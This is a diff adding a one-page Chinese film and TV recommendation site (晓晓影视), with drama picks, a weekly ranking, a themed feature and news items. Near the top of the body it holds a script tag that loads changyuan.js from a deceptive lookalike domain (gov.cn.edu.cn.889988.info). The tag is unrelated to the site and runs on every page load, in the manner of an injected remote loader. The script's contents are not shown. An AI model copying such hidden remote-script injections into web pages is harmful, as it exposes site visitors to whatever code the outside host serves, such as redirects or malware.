@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="referrer" content="origin-when-cross-origin">
+<title>晓晓影视 · 在线看剧追片指南｜xiaoxiaoyingshi-top.github.io</title>
+<meta name="description" content="晓晓影视是面向华语观众的影视内容指南站，整理正在热播的国产剧、院线电影、经典老片与纪录片片单，提供分集剧情、演职员资料、播出时间和高清观看入口提示，帮你在繁杂片源里快速挑到值得花时间的一部。">
+<meta name="keywords" content="晓晓影视,影视推荐,国产剧,电影解说,热播剧,纪录片,在线看片,片单,剧情介绍,演员表">
+<meta name="author" content="晓晓影视编辑组">
+<meta name="theme-color" content="#0b1020">
+<link rel="canonical" href="https://xiaoxiaoyingshi-top.github.io/">
+<style>
+:root{
+  --bg:#f5f2ec; --paper:#fffdf9; --ink:#1b1c22; --ink2:#4a4c57;
+  --line:#e3ddd2; --accent:#c2410c; --accent2:#1d4ed8; --muted:#8b887f;
+}
+*{box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,"Microsoft YaHei",serif;
+  font-size:16px;line-height:1.85}
+img{max-width:100%;display:block}
+a{color:var(--accent2);text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+
+/* 报头 */
+.masthead{background:var(--ink);color:#f7f5f0;padding:26px 0 18px;border-bottom:5px solid var(--accent)}
+.masthead .row{display:flex;align-items:flex-end;justify-content:space-between;gap:18px;flex-wrap:wrap}
+.kicker{font-size:12px;letter-spacing:.28em;color:#c9c4b6;margin:0 0 8px;font-family:system-ui,sans-serif}
+.site-title{font-size:40px;line-height:1.1;margin:0;letter-spacing:.04em;font-weight:700}
+.site-title span{color:#f0a06b}
+.meta-line{font-size:12.5px;color:#a8a396;font-family:system-ui,sans-serif;margin-top:10px}
+.meta-line b{color:#f0a06b;font-weight:600}
+
+/* 导航 */
+nav.toc{background:var(--paper);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:20}
+nav.toc .inner{display:flex;align-items:center;gap:6px;overflow-x:auto;padding:10px 20px}
+nav.toc a{font-family:system-ui,sans-serif;font-size:14px;color:var(--ink2);padding:7px 13px;border:1px solid transparent;white-space:nowrap;border-radius:3px}
+nav.toc a:hover{color:var(--accent);border-color:var(--line);background:#fbf8f2}
+nav.toc a.on{color:#fff;background:var(--accent);border-color:var(--accent)}
+
+/* 日期条 */
+.datebar{background:var(--accent);color:#fff;font-family:system-ui,sans-serif;font-size:13px;padding:8px 0}
+.datebar .wrap{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+
+main{padding:30px 0 60px}
+section{padding-top:34px}
+.sec-h{display:flex;align-items:baseline;gap:12px;border-bottom:2px solid var(--ink);padding-bottom:8px;margin-bottom:22px}
+.sec-h h2{font-size:24px;margin:0;letter-spacing:.03em}
+.sec-h em{font-style:normal;font-size:13px;color:var(--muted);font-family:system-ui,sans-serif}
+.sec-h a.top{margin-left:auto;font-size:12.5px;color:var(--muted);font-family:system-ui,sans-serif}
+
+/* 头条 */
+.lede{display:grid;grid-template-columns:1.55fr .45fr;gap:28px;margin-bottom:8px}
+.lede figure{margin:0;background:#e8e3d9;aspect-ratio:16/10;display:flex;align-items:center;justify-content:center;color:#8b8577;font-family:system-ui,sans-serif;font-size:13px}
+.lede h3{font-size:27px;line-height:1.4;margin:0 0 12px}
+.lede p{margin:0;color:var(--ink2);font-size:16.5px}
+.byline{font-family:system-ui,sans-serif;font-size:12.5px;color:var(--muted);margin-top:14px}
+
+/* 卡片 */
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.card{background:var(--paper);border:1px solid var(--line);border-radius:4px;overflow:hidden;display:flex;flex-direction:column}
+.card .thumb{background:#e6e0d5;aspect-ratio:3/4;display:flex;align-items:center;justify-content:center;color:#8b8577;font-family:system-ui,sans-serif;font-size:12.5px}
+.card .body{padding:14px 15px 16px;flex:1;display:flex;flex-direction:column}
+.card h4{margin:0 0 7px;font-size:17.5px;line-height:1.45}
+.card p{margin:0;font-size:14.5px;color:var(--ink2);flex:1}
+.tag{display:inline-block;font-family:system-ui,sans-serif;font-size:11.5px;color:#fff;background:var(--accent2);padding:2px 8px;border-radius:2px;margin-bottom:9px;align-self:flex-start}
+.score{font-family:system-ui,sans-serif;font-size:12px;color:var(--accent);margin-top:11px}
+
+/* 榜单 */
+.rank{background:var(--paper);border:1px solid var(--line);border-radius:4px;padding:6px 18px 16px}
+.rank ol{margin:0;padding-left:0;list-style:none;counter-reset:r}
+.rank li{counter-increment:r;display:flex;gap:12px;align-items:baseline;padding:13px 0;border-bottom:1px dashed var(--line);font-size:15.5px}
+.rank li:last-child{border-bottom:0}
+.rank li::before{content:counter(r,decimal-leading-zero);font-family:system-ui,sans-serif;font-weight:700;color:var(--accent);font-size:15px;min-width:30px}
+.rank li span{margin-left:auto;font-size:12.5px;color:var(--muted);font-family:system-ui,sans-serif;white-space:nowrap}
+
+/* 资讯列表 */
+.news{background:var(--paper);border:1px solid var(--line);border-radius:4px}
+.news article{padding:16px 20px;border-bottom:1px solid var(--line)}
+.news article:last-child{border-bottom:0}
+.news h4{margin:0 0 6px;font-size:18px}
+.news p{margin:0;color:var(--ink2);font-size:14.8px}
+.news time{font-family:system-ui,sans-serif;font-size:12px;color:var(--accent)}
+
+/* 专题 */
+.feature{background:var(--ink);color:#f2efe8;border-radius:5px;padding:28px 30px}
+.feature h3{margin:0 0 6px;font-size:23px;color:#f0a06b}
+.feature .sub{font-family:system-ui,sans-serif;font-size:13px;color:#a8a396;margin-bottom:20px}
+.feat-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.feat-grid div{background:#252832;border-radius:4px;padding:16px}
+.feat-grid h4{margin:0 0 7px;font-size:16.5px}
+.feat-grid p{margin:0;font-size:14px;color:#c9c5bb;line-height:1.75}
+
+/* 关于 */
+.about{background:var(--paper);border:1px solid var(--line);border-radius:4px;padding:26px 28px}
+.about p{margin:0 0 13px;color:var(--ink2)}
+.about p:last-child{margin-bottom:0}
+.about strong{color:var(--accent)}
+
+/* 联系 */
+.contact{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.contact .box{background:var(--paper);border:1px solid var(--line);border-radius:4px;padding:22px 24px}
+.contact h4{margin:0 0 10px;font-size:18px}
+.contact p{margin:0 0 9px;font-size:14.8px;color:var(--ink2)}
+.contact b{color:var(--ink)}
+
+footer{background:var(--ink);color:#c9c4b6;padding:34px 0 28px}
+footer .wrap{display:grid;grid-template-columns:1.4fr 1fr;gap:26px}
+footer h4{color:#f0a06b;margin:0 0 10px;font-size:17px}
+footer p{margin:0 0 9px;font-size:14px;line-height:1.8}
+footer a{color:#8fb0f2}
+.copy{border-top:1px solid #33373f;margin-top:24px;padding-top:16px;font-size:12.5px;font-family:system-ui,sans-serif;color:#7f7b72}
+
+@media (max-width:900px){
+  .grid,.feat-grid{grid-template-columns:repeat(2,1fr)}
+  .lede{grid-template-columns:1fr}
+}
+@media (max-width:620px){
+  body{font-size:15.4px}
+  .site-title{font-size:29px}
+  .grid,.feat-grid,.contact{grid-template-columns:1fr}
+  .sec-h h2{font-size:20px}
+  .lede h3{font-size:22px}
+  nav.toc .inner{padding:9px 14px}
+  footer .wrap{grid-template-columns:1fr}
+  .masthead{padding:20px 0 14px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="masthead">
+  <div class="wrap">
+    <div class="row">
+      <div>
+        <p class="kicker">晓晓影视 · 影视内容指南</p>
+        <h1 class="site-title">晓晓<span>影视</span></h1>
+      </div>
+      <div class="meta-line">
+        <div>网址：<b>https://xiaoxiaoyingshi-top.github.io</b></div>
+        <div>内容涵盖剧集 · 电影 · 纪录片 · 动漫</div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<nav class="toc" aria-label="栏目导航">
+  <div class="inner">
+    <a href="#top" class="on">首页</a>
+    <a href="#kan">片库频道</a>
+    <a href="#bang">本周榜单</a>
+    <a href="#zi">专题策划</a>
+    <a href="#xin">影视资讯</a>
+    <a href="#guan">关于晓晓影视</a>
+    <a href="#lian">联系方式</a>
+  </div>
+</nav>
+
+<div class="datebar"><div class="wrap"><span>每日更新片单与播出动态</span><span id="today"></span></div></div>
+
+<main id="top" class="wrap">
+
+  <section class="lede" aria-label="今日主打">
+    <figure>封面图｜今日主打</figure>
+    <div>
+      <h3>这个秋天值得补完的六部国产剧，从悬疑到家庭伦理都不踩雷</h3>
+      <p>晓晓影视编辑组把近三个月播出的剧集重新筛了一遍，去掉热度虚高、剧情注水的一批，留下六部节奏稳、表演在线、结局不烂尾的作品。每一部都附上适合人群和追剧节奏建议，通勤时段也能轻松安排。</p>
+      <div class="byline">编辑 · 晓晓影视内容组　｜　阅读约 8 分钟</div>
+    </div>
+  </section>
+
+  <section id="kan" aria-labelledby="h-kan">
+    <div class="sec-h"><h2 id="h-kan">片库频道</h2><em>按类型找片，少走弯路</em><a class="top" href="#top">返回顶部</a></div>
+    <div class="grid">
+      <article class="card">
+        <div class="thumb">海报位｜国产剧</div>
+        <div class="body">
+          <span class="tag">国产剧</span>
+          <h4>《南风知我意》追剧笔记</h4>
+          <p>都市情感题材，主线讲两个性格迥异的人在职场与家庭压力下重新认识自己。更新进度、分集看点、人物关系梳理一并整理。</p>
+          <div class="score">豆瓣评分 7.4　｜　已更 24 集</div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb">海报位｜院线电影</div>
+        <div class="body">
+          <span class="tag">院线电影</span>
+          <h4>十月院线观察：三部文艺片值得进影院</h4>
+          <p>票房不代表质量。这期挑出三部排片不多但完成度很高的作品，聊聊镜头语言和叙事结构，帮你决定值不值得买票。</p>
+          <div class="score">口碑指数 ★★★★☆</div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="thumb">海报位｜纪录片</div>
+        <div class="body">
+          <span class="tag">纪录片</span>
+          <h4>自然与人文：四部高分纪录片补片单</h4>
+          <p>从高原生态到老城手艺，单集时长友好，适合睡前或周末分段观看，画面信息量足，旁白不抢戏。</p>
+          <div class="score">单集 45 分钟　适合碎片时间</div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <section id="bang" aria-labelledby="h-bang">
+    <div class="sec-h"><h2 id="h-bang">本周榜单</h2><em>依据播放热度与观众口碑综合排序</em><a class="top" href="#top">返回顶部</a></div>
+    <div class="rank">
+      <ol>
+        <li>《南风知我意》<span>热度 96.2</span></li>
+        <li>《长安秘案录》<span>热度 91.8</span></li>
+        <li>《平凡的一天》<span>热度 88.5</span></li>
+        <li>《海岸线》<span>热度 84.1</span></li>
+        <li>《老城手艺》<span>热度 79.6</span></li>
+        <li>《深夜食堂·特别篇》<span>热度 76.3</span></li>
+        <li>《飞行家》<span>热度 72.0</span></li>
+        <li>《少年与海》<span>热度 68.7</span></li>
+      </ol>
+    </div>
+  </section>
+
+  <section id="zi" aria-labelledby="h-zi">
+    <div class="sec-h"><h2 id="h-zi">专题策划</h2><em>晓晓影视编辑部长期选题</em><a class="top" href="#top">返回顶部</a></div>
+    <div class="feature">
+      <h3>「一小时就能看完」短剧集专题</h3>
+      <div class="sub">单集 20 分钟左右，通勤、午休、睡前都能刷完一集</div>
+      <div class="feat-grid">
+        <div>
+          <h4>悬疑向</h4>
+          <p>节奏紧凑、反转集中在后半段，适合喜欢猜凶手的观众，不建议倍速观看。</p>
+        </div>
+        <div>
+          <h4>生活流</h4>
+          <p>没有强冲突，靠细节和台词撑起来，适合需要放松、不想动脑的夜晚。</p>
+        </div>
+        <div>
+          <h4>年代感</h4>
+          <p>服化道考究，场景还原度高，看完会想查一查那个年代的真实资料。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="xin" aria-labelledby="h-xin">
+    <div class="sec-h"><h2 id="h-xin">影视资讯</h2><em>播出安排、主创动态与平台更新</em><a class="top" href="#top">返回顶部</a></div>
+    <div class="news">
+      <article>
+        <time datetime="2026-10-18">10 月 18 日</time>
+        <h4>《长安秘案录》宣布加更，每周更新节奏调整为四集连播</h4>
+        <p>平台方回应称收视表现超出预期，后期制作已提前完成，追剧党可以把周末空出来一次性看完。</p>
+      </article>
+      <article>
+        <time datetime="2026-10-15">10 月 15 日</time>
+        <h4>下半年国产剧盘点：现实题材占比明显上升</h4>
+        <p>从备案到播出，行业内容结构正在变化，晓晓影视梳理了十部已定档的现实题材剧集及其主创阵容。</p>
+      </article>
+      <article>
+        <time datetime="2026-10-12">10 月 12 日</time>
+        <h4>三部纪录片定档，自然类题材扎堆上线</h4>
+        <p>同期上线的还有两部海外引进纪录片，中文配音版本与原声版本将同步提供。</p>
+      </article>
+      <article>
+        <time datetime="2026-10-09">10 月 9 日</time>
+        <h4>老剧重看系列：那些年被低估的国产家庭剧</h4>
+        <p>换一个年纪再看，感受完全不同。这一期选了五部，聊聊为什么它们现在反而更好看。</p>
+      </article>
+    </div>
+  </section>
+
+  <section id="guan" aria-labelledby="h-guan">
+    <div class="sec-h"><h2 id="h-guan">关于晓晓影视</h2><em>我们做什么，不做什么</em><a class="top" href="#top">返回顶部</a></div>
+    <div class="about">
+      <p><strong>晓晓影视</strong>是一个由几位长期追剧的人维护的影视内容指南站。我们不搬运资源，也不提供下载，只做一件事：在海量片源里帮观众把值得看的内容挑出来，并把关键信息讲清楚。</p>
+      <p>网站的内容以国产剧、院线电影、纪录片和少量动漫为主，更新频率大致是每周三篇片单、两篇资讯、一个专题策划。选片标准只有三条：剧情不注水、表演在线、结局不糊弄。</p>
+      <p>所有评分与推荐均为编辑主观判断，不代表客观标准。口味这件事没有标准答案，如果某一篇推荐不合你意，欢迎通过下方的联系方式告诉我们，你的反馈会直接影响下一期片单的方向。</p>
+      <p>访问地址始终为 <strong>https://xiaoxiaoyingshi-top.github.io</strong>，书签收藏这一个网址即可，其他相似域名的站点与本站无关。</p>
+    </div>
+  </section>
+
+  <section id="lian" aria-labelledby="h-lian">
+    <div class="sec-h"><h2 id="h-lian">联系方式</h2><em>反馈、投稿与合作</em><a class="top" href="#top">返回顶部</a></div>
+    <div class="contact">
+      <div class="box">
+        <h4>读者反馈</h4>
+        <p>对某一篇推荐有不同看法，或者想让我们测评某部剧，直接留言即可，编辑会在两个工作日内回复。</p>
+        <p><b>反馈入口：</b>网站首页底部留言区</p>
+      </div>
+      <div class="box">
+        <h4>内容投稿与商务</h4>
+        <p>长期接受影视评论、观影手记类投稿，也开放合适的品牌与内容合作洽谈。</p>
+        <p><b>官方网址：</b>https://xiaoxiaoyingshi-top.github.io</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div>
+      <h4>晓晓影视</h4>
+      <p>一个只做推荐、不做搬运的影视内容指南站。片单、榜单、专题与资讯，全部由编辑人工筛选整理。</p>
+      <p>本站不提供任何影视资源下载，也不存储第三方播放文件，所有内容仅供信息参考。</p>
+    </div>
+    <div>
+      <h4>快速导航</h4>
+      <p><a href="#kan">片库频道</a>　·　<a href="#bang">本周榜单</a>　·　<a href="#xin">影视资讯</a></p>
+      <p><a href="#guan">关于晓晓影视</a>　·　<a href="#lian">联系方式</a></p>
+    </div>
+  </div>
+  <div class="wrap copy">
+    © <span id="yr">2026</span> 晓晓影视　网址：https://xiaoxiaoyingshi-top.github.io　|　本页为单页结构，栏目内链以锚点形式跳转
+  </div>
+</footer>
+
+<script>
+document.getElementById('today').textContent = new Date().toLocaleDateString('zh-CN',{year:'numeric',month:'long',day:'numeric',weekday:'short'});
+document.getElementById('yr').textContent = new Date().getFullYear();
+document.querySelectorAll('nav.toc a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.querySelectorAll('nav.toc a').forEach(function(x){x.classList.remove('on')});
+    a.classList.add('on');
+  });
+});
+</script>
+</body>
+</html>
